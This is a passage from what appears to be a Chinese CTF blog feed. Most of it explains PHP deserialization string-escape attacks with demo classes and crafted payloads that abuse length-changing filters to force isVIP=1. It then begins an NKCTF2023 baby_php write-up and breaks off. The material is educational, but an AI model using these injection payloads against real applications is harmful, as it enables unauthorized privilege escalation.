class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>此时，<code>admin</code>在序列化串中已经变成了 <code>hacker</code> ，并且字符串长度比5多了一个，变成了6</p><p>我们对比一下两次的输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<span class="hljs-comment">//过滤前</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125; <span class="hljs-comment">//过滤后</span><br></code></pre></td></tr></table></figure><p>我们想要构造，将 isVIP的值变成 1，如何才能做到呢？<code>admin位置</code>现有字串与目标字串如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125; //现有字串</span><br><span class="hljs-string">&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125; <span class="hljs-comment">//目标字串</span><br></code></pre></td></tr></table></figure><p>我们知道，传入的admin位置是<strong>可控变量</strong> ，所以我们需要在该位置插入目标字串，</p><p>目标字串的 <code>&quot;;</code> 将admin参数位置处的双引号闭合，即可造成字符逃逸</p><p>但是我们admin参数位置处的字符串长度对应不上，由于我们需要逃逸出来的字符串为：</p><p><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> 其长度为47.</p><p>这就导致我们admin传参位置的参数少了47长度，必须再添加47长度才行，但是怎么添加呢？</p><p>我们知道，每次过滤的时候，<code>admin</code> 会变为：<code>hacker</code> 长度加了1，所以我们传参时可以重复47次 <code>admin</code>。这样我们的参数就会增加47长度，再减去逃逸的47长度字符串，长度就合适了。</p><p>可控变量修改如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:1;&#125;</span><br></code></pre></td></tr></table></figure><p>完整的代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.PHP_EOL;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">282</span>:<span class="hljs-string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125;<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125;</span><br><span class="hljs-string">O:4:&quot;</span>user<span class="hljs-string">&quot;:3:&#123;s:8:&quot;</span>username<span class="hljs-string">&quot;;s:282:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:1;&#125;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;user <span class="hljs-title function_ invoke__">Object</span><br>(<br>    [username] =&gt; hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<br>    [password] =&gt; <span class="hljs-number">123456</span><br>    [isVIP] =&gt; <span class="hljs-number">1</span><br>)<br></code></pre></td></tr></table></figure><p><strong>反序列化后，多余的子串会被抛弃</strong>, 在大括号 } 之外的原先字串就被抛弃了：</p><p><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code></p><p>我们观察反序列化之后的输出 isVIP&#x3D;1，反序列化字符串逃逸已经成功了。</p><h3 id="过滤后字符串变少"><a href="#过滤后字符串变少" class="headerlink" title="过滤后字符串变少"></a>过滤后字符串变少</h3><p>我们将上面过滤参数中 <code>hacker</code> 改为 <code>hack</code>，其余代码不变：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hack&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>发现如果username值存在<code>admin</code>,会被替换为 <code>hack</code> ，长度减一</p><p>此处输出的username值的长度已经不符合5了</p><p>我们也要想办法构造，使得 <code>isVIP=1</code>  ，我们对比一下现有子串和目标子串：（长度为47）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125; //现有</span><br><span class="hljs-string">&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125; <span class="hljs-comment">//目标</span><br></code></pre></td></tr></table></figure><p>php反序列化有一个特性：</p><p><strong>当序列化字符串属性的长度不够时，会往后走，直到长度与规定的长度相等为止.</strong></p><blockquote><p>例如，此处序列化字符串属性值 <code>hack</code> 的长度为4，但是原本属性长度为5，所以会往后走1位，属性值为： <code>hack&quot; </code>  把后面的双引号也算进去了。也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p></blockquote><p>我们计算一下<strong>本可控变量末尾到下一可控变量的长度</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span>   <span class="hljs-comment">//长度为22</span><br></code></pre></td></tr></table></figure><p>因为每次过滤都会少一个字符，我们先将 admin重复22遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br><span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-variable">$a_seri</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a_seri_filter</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a_seri</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a_seri_filter</span>;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">105</span>:<span class="hljs-string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/KvXBduNPCS8A9qF.png" alt="img"></p><p>也就是说<strong>123456</strong>这个地方成为了我们的可控变量，在<strong>123456</strong>可控变量的位置中添加我们的目标子串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:1;&#125;//目标子串</span><br></code></pre></td></tr></table></figure><p>即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>我们构造对象，序列化后过滤，再输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">105</span>:<span class="hljs-string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">47</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125;</span><br></code></pre></td></tr></table></figure><p>仔细观察这一串字符串可以看到紫色方框内一共107个字符，但是前面只有显示105</p><p><img src="https://s2.loli.net/2023/01/04/QmBVMJCvFbYZ8cx.jpg" alt="20210820131653.png"></p><p><strong>造成这种现象的原因是</strong>：替换之前我们目标子串的位置是<strong>123456</strong>，一共<strong>6</strong>个字符，替换之后我们的目标子串显然超过<strong>10</strong>个字符，所以会造成计算得到的payload不准确</p><p><strong>解决办法是</strong>：多添加<strong>2</strong>个<strong>admin</strong>，这样就可以补上缺少的字符。长度再减2</p><p>最终代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br><span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);<br><span class="hljs-variable">$a_seri</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a_seri_filter</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a_seri</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a_seri_filter</span>;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">115</span>:<span class="hljs-string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">47</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/jnr7t4KDGWmdl2S.jpg" alt="image-20210820130134043"></p><p>这样长度就对上了。我们将反序列化后的对象输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">user <span class="hljs-title function_ invoke__">Object</span><br>(<br>    [username] =&gt; hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:47:&quot;</span><br>    [password] =&gt; <span class="hljs-number">123456</span><br>    [isVIP] =&gt; <span class="hljs-number">1</span><br>)<br></code></pre></td></tr></table></figure><p>此时 isVIP&#x3D;1 ，字符逃逸成功！</p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a href="https://www.freebuf.com/articles/web/285985.html">PHP反序列化字符逃逸详解</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化字符逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NKCTF2023</title>
    <link href="/2023/08/24/NKCTF2023/"/>
    <url>/2023/08/24/NKCTF2023/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="NKCTF2023"><a href="#NKCTF2023" class="headerlink" title="NKCTF2023"></a>NKCTF2023</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span 